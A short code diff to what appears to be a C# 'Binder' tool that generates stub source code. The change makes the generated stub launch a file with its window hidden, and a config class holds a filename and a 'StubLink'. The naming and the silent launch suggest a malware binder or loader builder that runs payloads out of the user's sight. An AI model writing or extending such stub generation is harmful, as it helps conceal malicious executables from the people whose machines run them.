@@ -485,8 +485,8 @@ namespace Binder
                 sb.AppendLine($"                ");
                 sb.AppendLine($"                var {processVar} = new ProcessStartInfo {{");
                 sb.AppendLine($"                    FileName = {pathVar},");
-                sb.AppendLine($"                    UseShellExecute = false,");
-                sb.AppendLine($"                    CreateNoWindow = true");
+                sb.AppendLine($"                    CreateNoWindow = true,");
+                sb.AppendLine($"                    WindowStyle = ProcessWindowStyle.Hidden");
                 sb.AppendLine($"                }};");
                 sb.AppendLine($"                ");
                 sb.AppendLine($"                Process.Start({processVar});");
@@ -512,4 +512,5 @@ namespace Binder
         public string Filename { get; set; } = string.Empty;
         public string StubLink { get; set; } = string.Empty;
     }
+
 } 
